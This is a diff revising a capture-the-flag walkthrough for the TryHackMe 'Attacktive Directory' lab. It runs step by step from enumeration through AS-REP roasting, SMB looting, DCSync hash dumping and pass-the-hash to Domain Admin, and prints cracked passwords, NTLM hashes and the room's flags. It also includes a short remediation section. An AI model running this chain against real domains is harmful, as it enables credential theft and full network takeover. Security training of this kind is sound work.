@@ -1,104 +1,127 @@
 # Walkthrough — Attacktive Directory
 
-> Technical narrative: an Active Directory attack from unauthenticated outsider to Domain Admin.
+> Technical narrative, organized by the six-phase methodology: **Recon → Enumeration → Vulnerability Analysis → Exploitation → Post-Exploitation → Reporting**. An Active Directory attack from unauthenticated outsider to Domain Admin.
 
-**Target:** `10.129.173.201`  ·  **Room:** https://tryhackme.com/room/attacktivedirectory  ·  **Date:** 2026-11-23
-**Scenario:** A Windows Server **Domain Controller**. Goal: enumerate the domain, obtain a foothold credential, loot, and escalate to **Domain Administrator**.
+**Target:** `10.129.173.201` (DC `ATTACKTIVEDIREC`)  ·  **Domain:** `spookysec.local` (NetBIOS `THM-AD`)
+**Room:** https://tryhackme.com/room/attacktivedirectory  ·  **Date:** 2026-11-23  ·  **Result:** Domain Admin.
 
 ---
 
-## Phase 1 — Recon & enumeration
-
-### 1.1 Full port scan
+## Phase 1 — Reconnaissance
 
 ```bash
 export IP=10.129.173.201
-nmap -p- --min-rate 10000 -T4 $IP -oN scans/01-allports.txt
+ping -c 2 $IP                                   # ttl=64 -> Windows via later banners
+nmap -p1-65535 --min-rate 10000 -T4 $IP -oN allports.txt
 ```
-_Result: Domain Controller fingerprint confirmed — 53 (DNS), 80 (HTTP), **88 (Kerberos)**, 135/139/445 (RPC/SMB), **389/636/3268/3269 (LDAP/GC)**, 464 (kpasswd), 593, 3389 (RDP), **5985/47001 (WinRM)**, 9389 (ADWS), plus dynamic RPC high ports. Kerberos + LDAP + ADWS = this is a DC; the attack surface is identity/credentials._
 
-### 1.2 Service/version scan on open ports
+Domain Controller fingerprint — 53 (DNS), 80, **88 (Kerberos)**, 135/139/445 (RPC/SMB), **389/636/3268/3269 (LDAP/GC)**, 464, 593, 3389 (RDP), **5985/47001 (WinRM)**, 9389 (ADWS), + dynamic RPC ports.
 
-```bash
-nmap -p <ports> -sC -sV -oN scans/02-services.txt $IP
-```
-_Expecting a Domain Controller footprint: 53 (DNS), 88 (Kerberos), 135/139/445 (RPC/SMB), 389/3268 (LDAP), 464 (kpasswd), 593, 636 (LDAPS), 3389 (RDP), 5985 (WinRM)._
+**Kerberos + LDAP + ADWS = this is a DC.** The attack surface is identity/credentials, not a single service exploit.
 
 ---
 
-## Phase 2 — Domain & user enumeration
+## Phase 2 — Enumeration
 
-- `enum4linux -A $IP` → **null sessions allowed** (`username '' password ''`) — anonymous SMB access (finding), but domain name not extracted on Server 2019.
-- `crackmapexec smb $IP` → **domain = `spookysec.local`**, host `ATTACKTIVEDIREC`, Windows Server 2019 (Build 17763), `signing:True` (SMB signing enforced).
-
-```bash
-echo "10.129.173.201 spookysec.local" | sudo tee -a /etc/hosts
-```
-
-### Kerberos user enumeration (kerbrute)
+### 2.1 Service detail + domain name
 
 ```bash
-kerbrute userenum --dc 10.129.173.201 -d spookysec.local /root/userlist.txt
+nmap -p53,80,88,135,139,389,445,464,636,3268,3389,5985,9389 -sC -sV -oN services.txt $IP
+enum4linux -A $IP                 # null sessions ALLOWED (anonymous SMB) but domain not extracted on 2019
+crackmapexec smb $IP              # -> domain:spookysec.local, host ATTACKTIVEDIREC, Windows Server 2019, signing:True
+echo "$IP spookysec.local" | sudo tee -a /etc/hosts
 ```
-_Result: 8 valid accounts — `james`, **`svc-admin`** (service acct), `robin`, `darkstar`, `administrator`, **`backup`**, `paradox`, `ori`._
 
-## Phase 3 — AS-REP Roasting (foothold)
-
-`svc-admin` has "Do not require Kerberos pre-authentication" set, so the DC will hand out an AS-REP encrypted with the account's password-derived key to **anyone**, unauthenticated — crackable offline.
+### 2.2 User enumeration via Kerberos
 
 ```bash
-impacket-GetNPUsers spookysec.local/svc-admin -no-pass -dc-ip 10.129.173.201 -format hashcat -outputfile loot/asrep.hash
+kerbrute userenum --dc $IP -d spookysec.local /root/userlist.txt
 ```
-_Result:_ _(pending — $krb5asrep$ hash)_
+Kerbrute reads the Kerberos pre-auth response difference to confirm valid users **without sending passwords** (no lockouts). Valid accounts:
+`james`, **`svc-admin`** (service acct), `robin`, `darkstar`, `administrator`, **`backup`**, `paradox`, `ori`.
 
-Crack it (John auto-detects `krb5asrep`; hashcat mode 18200 also works):
-```bash
-john asrep.hash --wordlist=/root/passwordlist.txt
-```
-_Result: **`svc-admin : management2005`** (cracked <1s). First valid domain credential._
-
-## Phase 4 — SMB loot
-
-Authenticated share enumeration with the foothold credential:
-```bash
-crackmapexec smb 10.129.173.201 -u svc-admin -p management2005 --shares
-```
-_Result:_ _(pending — look for a readable `backup` share)_
+### 2.3 Authenticated SMB share enumeration (after Phase 4 foothold)
 
 ```bash
-smbclient //10.129.173.201/backup -U 'spookysec.local/svc-admin%management2005'
-# smb> get <file>
+crackmapexec smb $IP -u svc-admin -p management2005 --shares   # 'backup' share = READ
+smbclient -L //$IP/ -U svc-admin                               # 6 shares total
 ```
-_Result:_ _(pending — backup account credential)_
 
-## Phase 5 — Domain compromise (DCSync + Pass-the-Hash)
+---
 
-`backup_credentials.txt` (base64) decoded to `backup@spookysec.local:backup2517860`. The `backup` account holds replication rights → DCSync.
+## Phase 3 — Vulnerability Analysis
+
+Enumeration surfaced four distinct weaknesses, ranked:
+
+| Weakness | Severity | Why it matters |
+|----------|----------|----------------|
+| `svc-admin` has **Kerberos pre-auth disabled** | High | AS-REP roastable — hash retrievable unauthenticated |
+| **Weak passwords** (in common wordlists) | High | negates Kerberos/NTLM hashing |
+| **Credentials stored base64** on a readable share | High | encoding ≠ encryption; instant disclosure |
+| **`backup` holds replication rights** | Critical | enables DCSync → every domain hash |
+
+Attack path: AS-REP roast `svc-admin` → loot SMB for `backup` cred → DCSync → Pass-the-Hash as Administrator.
+
+---
+
+## Phase 4 — Exploitation
+
+### 4.1 AS-REP Roasting (foothold credential)
 
 ```bash
-impacket-secretsdump spookysec.local/backup:backup2517860@10.129.173.201
+impacket-GetNPUsers spookysec.local/svc-admin -no-pass -dc-ip $IP -format hashcat -outputfile asrep.hash
+john asrep.hash --wordlist=/root/passwordlist.txt      # -> svc-admin : management2005
 ```
-_Result:_ _(pending — full NTLM hash dump incl. Administrator)_
+The DC hands out `svc-admin`'s AS-REP (encrypted with its password key) to an unauthenticated requester because pre-auth is off; cracked offline in <1s.
 
-_Result: DCSync succeeded (the top `rpc_s_access_denied` is only the SAM fallback failing). Dumped all domain NTLM hashes. **Administrator NTLM = `0e0363213e37b94221497260b0bcb4fc`** (shared by `a-spooks`, the human DA); `krbtgt` hash also obtained (Golden Ticket capable)._
+### 4.2 SMB loot → backup account
 
-Pass-the-Hash into the DC as Administrator (no cracking needed):
 ```bash
-evil-winrm -i 10.129.173.201 -u administrator -H 0e0363213e37b94221497260b0bcb4fc
+smbclient //$IP/backup -U 'spookysec.local/svc-admin%management2005'
+#   smb> get backup_credentials.txt
+cat backup_credentials.txt | base64 -d ; echo          # -> backup@spookysec.local:backup2517860
 ```
-_Result: interactive shell as **`thm-ad\administrator`** — Domain Admin on the DC. (NetBIOS domain confirmed here as **THM-AD**.)_
+The credential was merely **base64-encoded** (reversible instantly, no key).
 
-## Phase 6 — Proof of compromise
+**Initial access vector: AS-REP Roasting of a pre-auth-disabled service account.**
 
+---
+
+## Phase 5 — Post-Exploitation
+
+### 5.1 DCSync — dump all domain hashes
+
+The `backup` account holds `DS-Replication-Get-Changes`, so it can impersonate a DC and replicate the AD secrets database (DCSync):
+
+```bash
+impacket-secretsdump spookysec.local/backup:backup2517860@$IP
+# Administrator:500:...:0e0363213e37b94221497260b0bcb4fc:::
+# krbtgt:502:...:0e2eb8158c27bed09861033026be4c21:::   (Golden Ticket key)
+# a-spooks:1601:...:0e0363213e37b94221497260b0bcb4fc::: (human DA; same pw as Administrator)
 ```
-whoami  -> thm-ad\administrator
+(The top `rpc_s_access_denied` is only the SAM fallback failing — the DRSUAPI/DCSync method succeeded.)
+
+### 5.2 Pass-the-Hash → Domain Admin
+
+The NTLM hash is itself a valid authenticator — no cracking needed:
+
+```bash
+evil-winrm -i $IP -u administrator -H 0e0363213e37b94221497260b0bcb4fc
 ```
-| Flag | Location | Value |
-|------|----------|-------|
-| User | `C:\Users\svc-admin\Desktop\user.txt.txt` | `TryHackMe{K3rb3r0s_Pr3_4uth}` |
-| PrivEsc | `C:\Users\backup\Desktop\PrivEsc.txt` | `TryHackMe{B4ckM3UpSc0tty!}` |
-| Root | `C:\Users\Administrator\Desktop\root.txt` | `TryHackMe{4ctiveD1rectoryM4st3r}` |
 
-## Attack chain summary
+### 5.3 Proof of compromise
 
-nmap (DC fingerprint) → `crackmapexec` (domain `spookysec.local`) → `kerbrute userenum` (8 users) → **AS-REP Roast** `svc-admin` (no pre-auth) → John crack (`management2005`) → SMB loot `backup` share → base64-decoded `backup:backup2517860` → **DCSync** (`secretsdump`, backup's replication rights) → Administrator NTLM → **Pass-the-Hash** (Evil-WinRM) → **Domain Admin**.
+```powershell
+whoami                                              # thm-ad\administrator  (Domain Admin)
+type C:\Users\svc-admin\Desktop\user.txt.txt        # TryHackMe{K3rb3r0s_Pr3_4uth}
+type C:\Users\backup\Desktop\PrivEsc.txt            # TryHackMe{B4ckM3UpSc0tty!}
+type C:\Users\Administrator\Desktop\root.txt        # TryHackMe{4ctiveD1rectoryM4st3r}
+```
+
+**Full chain:** nmap (DC) → `crackmapexec` (domain) → `kerbrute` (users) → **AS-REP Roast** `svc-admin` → crack → SMB loot (base64 `backup` cred) → **DCSync** → Administrator NTLM → **Pass-the-Hash** → **Domain Admin**.
+
+---
+
+## Phase 6 — Reporting (risk translation)
+
+See **[`report.md`](./report.md)** for the formal write-up: 6 findings rated by CVSS with business impact and AD-specific remediation, the attack narrative, and a prioritized roadmap. Headline risk: **Critical — full Active Directory domain compromise** from an unauthenticated start, driven by an AS-REP-roastable service account, weak passwords, reversible credential storage, and an over-privileged replication account. Note `krbtgt` exposure enables persistent Golden Ticket forgery — remediation must include rotating `krbtgt` twice.
